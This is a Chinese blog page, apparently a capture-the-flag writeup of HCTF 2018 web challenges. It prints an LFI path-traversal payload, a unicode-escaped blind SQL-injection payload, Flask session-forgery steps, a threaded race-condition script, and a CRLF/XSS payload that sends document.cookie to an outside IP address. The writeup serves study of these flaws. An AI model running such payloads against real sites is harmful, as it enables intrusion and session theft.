@@ -1,0 +1,1405 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="HCTF-Web的部分WP, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>HCTF-Web的部分WP | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">HCTF-Web的部分WP</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-11-12
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-18
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.9k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>源码</p>
+<pre><code class="php">&lt;?php
+    class emmm
+    &#123;
+        public static function checkFile(&amp;$page)
+        &#123;
+            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+            if (! isset($page) || !is_string($page)) &#123;
+                echo &quot;you can&#39;t see it&quot;;
+                return false;
+            &#125;
+
+            if (in_array($page, $whitelist)) &#123;
+                return true;
+            &#125;
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+            );
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+            );
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        &#125;
+    &#125;
+
+    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+    ) &#123;
+        include $_REQUEST[&#39;file&#39;];
+        exit;
+    &#125; else &#123;
+        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+    &#125;  
+?&gt;</code></pre>
+<p>和phpadmin的<a href="http://seaii-blog.com/index.php/2018/07/03/84.html" target="_blank" rel="noopener">CVE-2018-12613</a>利用点一样，利用<code>？</code>的双重urlencode来绕过。</p>
+<p>payload：</p>
+<pre><code>http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../../ffffllllaaaagggg</code></pre>
+<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><blockquote>
+<p>描述</p>
+<p>A script kid’s phishing website</p>
+</blockquote>
+<p><a href="http://www.zip有源码泄漏,在member.php中存在注入./" target="_blank" rel="noopener">www.zip有源码泄漏，在member.php中存在注入。</a></p>
+<p>Member.php</p>
+<pre><code class="php">&lt;?php
+if (!defined(&#39;IN_CRONLITE&#39;)) exit();
+$islogin = 0;
+if (isset($_COOKIE[&quot;islogin&quot;])) &#123;
+    if ($_COOKIE[&quot;login_data&quot;]) &#123;
+        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+        $admin_user = $login_data[&#39;admin_user&#39;];
+        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
+        if ($udata[&#39;username&#39;] == &#39;&#39;) &#123;
+            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
+            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
+        &#125;
+        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+        if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;
+            $islogin = 1;
+        &#125; else &#123;
+            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
+            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
+        &#125;
+    &#125;
+&#125;
+if (isset($_SESSION[&#39;islogin&#39;])) &#123;
+    if ($_SESSION[&quot;admin_user&quot;]) &#123;
+        $admin_user = base64_decode($_SESSION[&#39;admin_user&#39;]);
+        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
+        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+        if ($admin_pass == $_SESSION[&quot;admin_pass&quot;]) &#123;
+            $islogin = 1;
+        &#125;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p>Safe.php</p>
+<pre><code class="php">&lt;?php
+function waf($string)
+&#123;
+    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
+    return preg_replace_callback($blacklist, function ($match) &#123;
+        return &#39;@&#39; . $match[0] . &#39;@&#39;;
+    &#125;, $string);
+&#125;
+
+function safe($string)
+&#123;
+    if (is_array($string)) &#123;
+        foreach ($string as $key =&gt; $val) &#123;
+            $string[$key] = safe($val);
+        &#125;
+    &#125; else &#123;
+        $string = waf($string);
+    &#125;
+    return $string;
+&#125;
+
+foreach ($_GET as $key =&gt; $value) &#123;
+    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
+        $value = safe($value);
+    &#125;
+    $_GET[$key] = $value;
+&#125;
+foreach ($_POST as $key =&gt; $value) &#123;
+    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
+        $value = safe($value);
+    &#125;
+    $_POST[$key] = $value;
+&#125;
+foreach ($_COOKIE as $key =&gt; $value) &#123;
+    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
+        $value = safe($value);
+    &#125;
+    $_COOKIE[$key] = $value;
+&#125;
+unset($cplen, $key, $value);
+?&gt;</code></pre>
+<p>cookie注入，unicode编码过waf。</p>
+<p>payload：</p>
+<pre><code>admin&#39; and (if(ascii(substr(database(),1,1))&gt;10,sleep(3),1))#
+⬇️
+\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0028\u0069\u0066\u0028\u0061\u0073\u0063\u0069\u0069\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002c\u0031\u002c\u0031\u0029\u0029\u003e\u0031\u0030\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0033\u0029\u002c\u0031\u0029\u0029\u0023</code></pre>
+<p>写脚本盲注就ok。</p>
+<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote>
+<p>描述</p>
+<p>only admin can get it update1/更新1: 1. fix bugs 2. attention: you may need to restart all your work as something has changed hint: 1. docker 2. only few things running on it update2/更新2: Sorry，there are still some bugs, so down temporarily. update3/更新3: fixed bug</p>
+</blockquote>
+<p>软连接读源码+season伪造</p>
+<p>读<code>/proc/self/environ</code>得到uwsgi配置文件。</p>
+<pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
+SUPERVISOR_GROUP_NAME=uwsgi
+HOSTNAME=323a960bcc1a
+SHLVL=0
+PYTHON_PIP_VERSION=18.1
+HOME=/root
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
+NGINX_MAX_UPLOAD=0
+UWSGI_PROCESSES=16
+STATIC_URL=/static
+UWSGI_CHEAPER=2
+NGINX_VERSION=1.13.12-1~stretch
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NJS_VERSION=1.13.12.0.2.0-1~stretch
+LANG=C.UTF-8
+SUPERVISOR_ENABLED=1
+PYTHON_VERSION=3.6.6
+NGINX_WORKER_PROCESSES=auto
+SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
+SUPERVISOR_PROCESS_NAME=uwsgi
+LISTEN_PORT=80STATIC_INDEX=0
+PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
+STATIC_PATH=/app/static
+PYTHONPATH=/app
+UWSGI_RELOADS=</code></pre>
+<p>再去读<code>UWSGI_INI</code></p>
+<pre><code>[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</code></pre>
+<p>去读文件<code>app/hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main.py </code></p>
+<p>得到源码：</p>
+<pre><code class="python"># -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)
+app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024
+ALLOWED_EXTENSIONS = set([&#39;zip&#39;])
+
+def allowed_file(filename):
+    return &#39;.&#39; in filename and \
+           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+    error = request.args.get(&#39;error&#39;, &#39;&#39;)
+    if(error == &#39;1&#39;):
+        session.pop(&#39;username&#39;, None)
+        return render_template(&#39;index.html&#39;, forbidden=1)
+
+    if &#39;username&#39; in session:
+        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)
+    else:
+        return render_template(&#39;index.html&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
+def login():
+    username=request.form[&#39;username&#39;]
+
+    password=request.form[&#39;password&#39;]
+    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:
+        if(username == &#39;admin&#39;):
+            return redirect(url_for(&#39;index&#39;,error=1))
+        session[&#39;username&#39;] = username
+    return redirect(url_for(&#39;index&#39;))
+
+
+@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
+def logout():
+    session.pop(&#39;username&#39;, None)
+    return redirect(url_for(&#39;index&#39;))
+
+@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
+def upload_file():
+    if &#39;the_file&#39; not in request.files:
+        return redirect(url_for(&#39;index&#39;))
+    file = request.files[&#39;the_file&#39;]
+    if file.filename == &#39;&#39;:
+        return redirect(url_for(&#39;index&#39;))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
+        if(os.path.exists(file_save_path)):
+            return &#39;This file already exists&#39;
+        file.save(file_save_path)
+    else:
+        return &#39;This file is not a zipfile&#39;
+
+
+    try:
+        extract_path = file_save_path + &#39;_&#39;
+        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)
+        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)
+        file = read_obj.read()
+        read_obj.close()
+      os.system(&#39;rm -rf &#39; + extract_path)
+    except Exception as e:
+        file = None
+
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):
+            return redirect(url_for(&#39;index&#39;, error=1))
+    return Response(file)
+
+
+if __name__ == &#39;__main__&#39;:
+    #app.run(debug=True)
+    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre>
+<p>知道了他security_key的生成方式：<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></p>
+<p><code>random.seed(uuid.getnode())</code>，种子是<code>uuid.getnode()</code>，服务器mac地址的十进制数。</p>
+<p>去读一下mac地址：<code>/sys/class/net/eyh0/address</code></p>
+<p>看一下原cookie的内容：<code>&#123;&quot;username&quot;:&quot;aaa&quot;&#125;</code></p>
+<p>起个flask生成一下admin的session去替换cookie就ok了。</p>
+<p>[要用python3]</p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><h3 id="解法一：利用unicode编码"><a href="#解法一：利用unicode编码" class="headerlink" title="解法一：利用unicode编码"></a>解法一：利用unicode编码</h3><p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="noopener">Unicode安全</a></p>
+<p><code>nodeprep.prepare</code>函数处理用户名造成的问题</p>
+<pre><code class="python">def strlower(username):
+    username = nodeprep.prepare(username)
+    return username</code></pre>
+<p>注册一个<code>ᴬdmin</code>，处理后变成<code>Admin</code>，更改密码改的是<code>admin</code>的密码，登陆就ok了。</p>
+<h3 id="解法二：伪造session"><a href="#解法二：伪造session" class="headerlink" title="解法二：伪造session"></a>解法二：伪造session</h3><p>github能搜到源码<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
+<p>有security_key，我们就可以伪造session了，利用admin登陆就ok。</p>
+<pre><code class="python">class Config(object):
+    SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
+    SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;
+    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre>
+<h3 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h3><p>来自<a href="https://xz.aliyun.com/t/3242#toc-14" target="_blank" rel="noopener">Whitzard的wp</a></p>
+<p>脚本</p>
+<pre><code class="python">import requests
+import threading
+
+def login(s, username, password):
+    data = &#123;
+        &#39;username&#39;: username,
+        &#39;password&#39;: password,
+        &#39;submit&#39;: &#39;&#39;
+    &#125;
+    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)
+
+def logout(s):
+    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)
+
+def change(s, newpassword):
+    data = &#123;
+        &#39;newpassword&#39;:newpassword
+    &#125;
+    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)
+
+def func1(s):
+    login(s, &#39;ddd&#39;, &#39;ddd&#39;)
+    change(s, &#39;qweqweabcabc&#39;)
+
+def func2(s):
+    logout(s)
+    res = login(s, &#39;admin&#39;, &#39;qweqweabcabc&#39;)
+    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:
+        print(&#39;finish&#39;)
+
+def main():
+    for i in range(1000):
+        print(i)
+        s = requests.Session()
+        t1 = threading.Thread(target=func1, args=(s,))
+        t2 = threading.Thread(target=func2, args=(s,))
+        t1.start()
+        t2.start()
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+<p>源码里改密码的username直接从session中取了。</p>
+<pre><code class="python">def login():
+    if current_user.is_authenticated:
+        return redirect(url_for(&#39;index&#39;))
+
+    form = LoginForm()
+    if request.method == &#39;POST&#39;:
+        name = strlower(form.username.data)
+        session[&#39;name&#39;] = name        #这
+        user = User.query.filter_by(username=name).first()
+        if user is None or not user.check_password(form.password.data):
+            flash(&#39;Invalid username or password&#39;)
+            return redirect(url_for(&#39;login&#39;))
+        login_user(user, remember=form.remember_me.data)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)
+
+@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def change():
+    if not current_user.is_authenticated:
+        return redirect(url_for(&#39;login&#39;))
+    form = NewpasswordForm()
+    if request.method == &#39;POST&#39;:
+        name = strlower(session[&#39;name&#39;])    #这里造成了问题
+        user = User.query.filter_by(username=name).first()
+        user.set_password(form.newpassword.data)
+        db.session.commit()
+        flash(&#39;change successful&#39;)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre>
+<h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><blockquote>
+<p>Not hard, I believe you are the lucky one!</p>
+</blockquote>
+<p>crlf+xss</p>
+<pre><code>https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html?tdsourcetag=s_pctim_aiomsg</code></pre>
+<p>payload：</p>
+<pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=`http://39.107.83.129/xss/?a=`%2bdocument.cookie%3C/script%3E</code></pre>
+<p>替换弹回来的cookie就OK了</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2018/11/12/hctf-web-de-bu-fen-wp/">https://lanvnal.com/2018/11/12/hctf-web-de-bu-fen-wp/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
